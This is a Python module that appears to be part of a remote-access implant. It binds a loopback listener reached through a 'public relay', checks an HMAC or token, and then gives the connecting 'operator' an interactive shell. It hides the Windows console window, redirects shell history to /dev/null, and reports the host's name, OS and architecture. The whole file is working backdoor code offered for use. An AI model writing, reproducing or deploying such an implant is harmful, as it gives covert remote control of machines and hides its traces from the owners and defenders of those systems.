"""Authenticated local shell endpoint.

Any connection to the loopback listener must pass a challenge/response before
a shell is attached, so the public relay cannot be used by someone who merely
guesses the port.

Protocol (text, one line each):
    agent -> "QU1 <nonce>\n"
    client -> "HMAC <hex>\n"   (or "KEY <token>\n" for a plain nc session)
    agent -> "OK\n"  |  "NO\n"

After OK the socket becomes the shell's stdin/stdout/stderr.
"""

import hashlib
import hmac
import os
import socket
import struct
import subprocess
import sys
import threading
import time

import qu_core

MAX_SESSIONS = 4


# --------------------------------------------------------------------------
# transport helpers
# --------------------------------------------------------------------------

def _readline(sock, limit=512, timeout=15.0):
    sock.settimeout(timeout)
    out = b""
    try:
        while len(out) < limit:
            ch = sock.recv(1)
            if not ch:
                return None
            if ch in (b"\n", b"\r"):
                if out:
                    return out.decode("utf-8", "replace")
                continue
            out += ch
    except Exception:
        return None
    return out.decode("utf-8", "replace")


def _constant_eq(a, b):
    try:
        return hmac.compare_digest(a, b)
    except Exception:
        return a == b


# --------------------------------------------------------------------------
# POSIX pty shell
# --------------------------------------------------------------------------

def _serve_pty(sock, argv, env):
    import pty
    import select
    import fcntl
    import termios

    pid, fd = pty.fork()
    if pid == 0:                                    # child
        try:
            os.execvpe(argv[0], argv, env)
        except Exception:
            os._exit(127)
        os._exit(0)

    try:
        # enter raw mode so the operator's terminal controls the remote one
        attrs = termios.tcgetattr(sock)
        raw = termios.tcgetattr(sock)
        raw[3] = raw[3] & ~(termios.ECHO | termios.ICANON | termios.IEXTEN | termios.ISIG)
        raw[1] = raw[1] & ~termios.OPOST
        termios.tcsetattr(sock, termios.TCSANOW, raw)
    except Exception:
        attrs = None

    socks = [sock, fd]
    client_open = True
    idle_since = time.time()
    try:
        while True:
            try:
                r, _, _ = select.select(socks, [], [], 1.0)
            except Exception:
                break
            if not r:
                if _child_gone(pid):
                    break
                if not client_open and time.time() - idle_since > 5:
                    break
                continue
            for s in r:
                try:
                    if s == sock:
                        data = sock.recv(65536)
                        if not data:
                            # Client hung up: stop watching it, but keep
                            # draining the shell until it exits or goes idle.
                            client_open = False
                            socks = [fd]
                            idle_since = time.time()
                            continue
                        idle_since = time.time()
                        os.write(fd, data)
                    else:
                        data = os.read(fd, 65536)
                        if not data:
                            return
                        idle_since = time.time()
                        sock.sendall(data)
                except Exception:
                    return
    finally:
        if attrs is not None:
            try:
                termios.tcsetattr(sock, termios.TCSANOW, attrs)
            except Exception:
                pass
        try:
            os.close(fd)
        except Exception:
            pass
        try:
            os.kill(pid, 9)
        except Exception:
            pass
        try:
            os.waitpid(pid, os.WNOHANG)
        except Exception:
            pass


def _child_gone(pid):
    try:
        done, _ = os.waitpid(pid, os.WNOHANG)
        return done == pid
    except Exception:
        return True


# --------------------------------------------------------------------------
# pipe shell (Windows, and any POSIX fallback)
# --------------------------------------------------------------------------

def _serve_pipes(sock, argv, env):
    kwargs = {}
    if os.name == "nt":
        kwargs["creationflags"] = 0x08000000            # CREATE_NO_WINDOW
    proc = subprocess.Popen(
        argv,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        env=env,
        bufsize=0,
        **kwargs
    )

    def pump_out():
        try:
            while True:
                data = proc.stdout.read(1)
                if not data:
                    break
                sock.sendall(data)
        except Exception:
            pass
        finally:
            try:
                sock.shutdown(socket.SHUT_WR)
            except Exception:
                pass

    t = threading.Thread(target=pump_out)
    t.daemon = True
    t.start()

    try:
        while True:
            data = sock.recv(65536)
            if not data:
                break
            try:
                proc.stdin.write(data)
                proc.stdin.flush()
            except Exception:
                break
    except Exception:
        pass
    finally:
        # Wait for the shell to finish writing before closing the socket, so a
        # client that piped its commands still receives every byte.
        try:
            t.join(20)
        except Exception:
            pass
        for closer in (lambda: proc.stdin.close(), lambda: proc.terminate()):
            try:
                closer()
            except Exception:
                pass
        try:
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass


# --------------------------------------------------------------------------
# platform shell command
# --------------------------------------------------------------------------

def _shell_argv():
    if os.name == "nt":
        comspec = os.environ.get("COMSPEC") or "cmd.exe"
        return [comspec, "/Q", "/K", "prompt $G"]
    shell = os.environ.get("SHELL") or "/bin/sh"
    for cand in (shell, "/bin/bash", "/bin/zsh", "/bin/sh"):
        if os.path.isfile(cand) and os.access(cand, os.X_OK):
            return [cand, "-i"]
    return ["/bin/sh", "-i"]


def _shell_env():
    env = dict(os.environ)
    env.setdefault("TERM", "xterm-256color")
    env.setdefault("HISTFILE", os.devnull)
    return env


# --------------------------------------------------------------------------
# session handling
# --------------------------------------------------------------------------

def handle(sock, peer=None):
    nonce = hashlib.sha256(
        ("%s:%s:%s" % (time.time(), os.getpid(), id(sock))).encode()
    ).hexdigest()[:32]
    try:
        sock.sendall(("QU1 %s\n" % nonce).encode())
        line = _readline(sock)
        if not line:
            return
        parts = line.split(None, 1)
        if len(parts) != 2:
            sock.sendall(b"NO\n")
            return
        kind, value = parts[0].upper(), parts[1].strip()

        if kind == "HMAC":
            ok = _constant_eq(value, qu_core.sign(nonce))
        elif kind == "KEY":
            ok = _constant_eq(value, qu_core.TOKEN)
        else:
            ok = False

        if not ok:
            sock.sendall(b"NO\n")
            return

        sock.sendall(("OK %s\n" % _banner()).encode())
        argv = _shell_argv()
        env = _shell_env()
        force_pipes = os.environ.get("QU_FORCE_PIPES") == "1"
        if os.name != "nt" and not force_pipes:
            _serve_pty(sock, argv, env)
        else:
            _serve_pipes(sock, argv, env)
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass


def _banner():
    try:
        import platform
        return "%s|%s|%s" % (platform.node(), platform.system(), platform.machine())
    except Exception:
        return "host"


def serve_forever(port, host="127.0.0.1"):
    """Block, accepting shell sessions. Returns only on hard failure."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(16)

    slots = threading.Semaphore(MAX_SESSIONS)
    while True:
        try:
            conn, peer = srv.accept()
        except Exception:
            time.sleep(0.5)
            continue
        try:
            conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except Exception:
            pass
        if not slots.acquire(False):
            try:
                conn.close()
            except Exception:
                pass
            continue

        def runner(c=conn, p=peer):
            try:
                handle(c, p)
            finally:
                slots.release()

        t = threading.Thread(target=runner)
        t.daemon = True
        t.start()
